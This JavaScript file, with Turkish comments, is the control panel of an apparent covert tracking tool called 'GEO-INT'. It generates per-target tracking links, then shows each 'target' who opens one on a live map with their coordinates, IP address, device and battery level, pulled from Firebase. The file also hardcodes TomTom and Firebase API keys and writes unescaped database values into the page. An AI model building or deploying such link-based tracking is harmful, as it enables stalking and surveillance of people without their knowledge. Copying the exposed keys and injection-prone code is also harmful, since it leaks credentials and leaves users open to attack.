// --- CONFIG VE SİSTEM AYARLARI ---
const TOMTOM_KEY = '3xX5NwSGmW2O8MyQ9fwOPqHA8chsMdY1'; 
const firebaseConfig = {
    apiKey: "AIzaSyCDNbgKzJdBKEZUnWH09Az6ZCwUefWJXhY",
    authDomain: "onlinesiparis-2cf91.firebaseapp.com",
    projectId: "onlinesiparis-2cf91",
    databaseURL: "https://onlinesiparis-2cf91-default-rtdb.europe-west1.firebasedatabase.app",
    storageBucket: "onlinesiparis-2cf91.appspot.com",
    messagingSenderId: "366801664755",
    appId: "1:366801664755:web:57b577f1943ebdf1ab8c85"
};

// Global Kontrol Değişkenleri
let map, trafficLayer, myLocationMarker;
let deviceMarkers = {}; 

// --- SİSTEM BAŞLATMA ---
if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
}
const database = firebase.database();

document.addEventListener('DOMContentLoaded', () => {
    initMap();
    setInterval(updateClock, 1000);
    addLog("GEO-INT v7.0 SİSTEMİ ÇEVRİMİÇİ.");
});

function initMap() {
    map = L.map('map', { center: [41.0082, 28.9784], zoom: 11, zoomControl: false });
    
    // Koyu Tema Harita Katmanı
    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png').addTo(map);
    
    // Canlı Trafik Katmanı
    trafficLayer = L.tileLayer(`https://{s}.api.tomtom.com/traffic/map/4/tile/flow/relative0/{z}/{x}/{y}.png?key=${TOMTOM_KEY}`, { opacity: 0.8 }).addTo(map);

    // Tıklama ile Adres ve Trafik Analizi
    map.on('click', onMapClick);
}

// --- LİNK OLUŞTURUCU (ÖZEL FORMAT: NODE_XXXX) ---
function generateTrackingLink() {
    const randomId = Math.floor(Math.random() * 900) + 100; // 100-999 arası sayı
    const nodeId = "NODE_" + randomId;
    
    // Tam istediğin kök dizin link formatı
    const fullURL = `https://berkaytdev.com/track.html?id=${nodeId}`;
    
    document.getElementById('generatedLink').value = fullURL;
    document.getElementById('linkModal').classList.remove('hidden');
    
    addLog(`TAKİP LİNKİ OLUŞTURULDU: ${nodeId}`);
}

// --- CİHAZ VE VERİ TAKİBİ ---
database.ref('locations').on('value', (snapshot) => {
    const data = snapshot.val();
    const list = document.getElementById('deviceList');
    list.innerHTML = ''; 

    if (!data) {
        list.innerHTML = '<div class="text-gray-600 italic text-center">Aktif cihaz yok.</div>';
        for (let id in deviceMarkers) { map.removeLayer(deviceMarkers[id]); delete deviceMarkers[id]; }
        return;
    }

    for (let id in data) {
        const info = data[id];
        
        // Marker Güncelleme/Oluşturma
        if (deviceMarkers[id]) {
            deviceMarkers[id].setLatLng([info.lat, info.lng]);
        } else {
            const devIcon = L.divIcon({
                className: 'dev-icon',
                html: `<div class="relative"><i class="fas fa-crosshairs text-green-500 fa-2x animate-pulse"></i><span class="absolute -top-4 left-4 bg-black/80 text-[8px] p-1 border border-green-500">${id}</span></div>`
            });
            deviceMarkers[id] = L.marker([info.lat, info.lng], { icon: devIcon }).addTo(map);
            addLog(`HEDEF SİSTEME GİRDİ: ${id}`);
        }

        // Cihaz Bilgi Kartı (IP, Cihaz, Pil vb.)
        const deviceDiv = document.createElement('div');
        deviceDiv.className = "glass-panel p-2 mb-2 border-l-2 border-green-500 text-[9px] relative group pointer-events-auto";
        deviceDiv.innerHTML = `
            <div class="flex justify-between items-start">
                <b class="text-green-400 italic">${id}</b>
                <button onclick="deleteDevice('${id}')" class="text-red-500 opacity-0 group-hover:opacity-100 transition-all"><i class="fas fa-trash text-[10px]"></i></button>
            </div>
            <div class="text-gray-400 mt-1 space-y-0.5">
                <div>IP: <span class="text-white">${info.ip || 'ALINIYOR...'}</span></div>
                <div>DEVICE: <span class="text-white">${info.device || 'BİLİNMİYOR'}</span></div>
                <div class="flex justify-between"><span>PİL: ${info.battery || '--'}</span> <span class="text-green-500 animate-pulse">CANLI</span></div>
            </div>
        `;
        list.appendChild(deviceDiv);
    }
});

// --- DİĞER FONKSİYONLAR ---
async function onMapClick(e) {
    const { lat, lng } = e.latlng;
    const popup = L.popup().setLatLng(e.latlng).setContent('<div class="text-[9px] animate-pulse">İSTİHBARAT TOPLANIYOR...</div>').openOn(map);
    try {
        const addrRes = await fetch(`https://api.tomtom.com/search/2/reverseGeocode/${lat},${lng}.json?key=${TOMTOM_KEY}&language=tr-TR`);
        const flowRes = await fetch(`https://api.tomtom.com/traffic/services/4/flowSegmentData/relative0/10/json?key=${TOMTOM_KEY}&point=${lat},${lng}`);
        const addr = await addrRes.json();
        const flow = await flowRes.json();
        
        let status = "AÇIK", color = "text-green-500";
        if (flow.flowSegmentData && (flow.flowSegmentData.currentSpeed / flow.flowSegmentData.freeFlowSpeed < 0.5)) {
            status = "YOĞUN / KAPALI"; color = "text-red-500";
        }

        popup.setContent(`
            <div class="text-[10px] font-mono">
                <b class="text-red-600 underline">KONUM_ANALİZ</b><br>
                <b>ADRES:</b> ${addr.addresses[0].address.freeformAddress}<br>
                <b>TRAFİK:</b> <span class="${color}">${status}</span>
            </div>
        `);
    } catch (err) { popup.setContent("BAĞLANTI HATASI."); }
}

function deleteDevice(id) {
    if (confirm(`${id} sistemden kalıcı olarak silinecek?`)) {
        database.ref('locations/' + id).remove().then(() => {
            if (deviceMarkers[id]) { map.removeLayer(deviceMarkers[id]); delete deviceMarkers[id]; }
            addLog(`CİHAZ SİLİNDİ: ${id}`);
        });
    }
}

async function searchLocation() {
    const q = document.getElementById('searchInput').value;
    const res = await fetch(`https://api.tomtom.com/search/2/geocode/${encodeURIComponent(q)}.json?key=${TOMTOM_KEY}&limit=1`);
    const data = await res.json();
    if (data.results && data.results[0]) map.flyTo([data.results[0].position.lat, data.results[0].position.lon], 15);
}

function getMyLocation() {
    navigator.geolocation.getCurrentPosition(p => {
        const coords = [p.coords.latitude, p.coords.longitude];
        if (myLocationMarker) map.removeLayer(myLocationMarker);
        myLocationMarker = L.circleMarker(coords, { radius: 8, color: '#00ffff' }).addTo(map);
        map.flyTo(coords, 16);
    });
}

function addLog(m) {
    const f = document.getElementById('dataFeed');
    const d = document.createElement('div');
    d.innerHTML = `<span class="text-red-800">[${new Date().toLocaleTimeString()}]</span> ${m}`;
    f.prepend(d);
}

function updateClock() { document.getElementById('sysTime').innerText = new Date().toLocaleTimeString('tr-TR'); }

function toggleLayer(t) {
    if (t === 'traffic') map.hasLayer(trafficLayer) ? map.removeLayer(trafficLayer) : trafficLayer.addTo(map);
    document.getElementById('btn-' + t).classList.toggle('active');
}
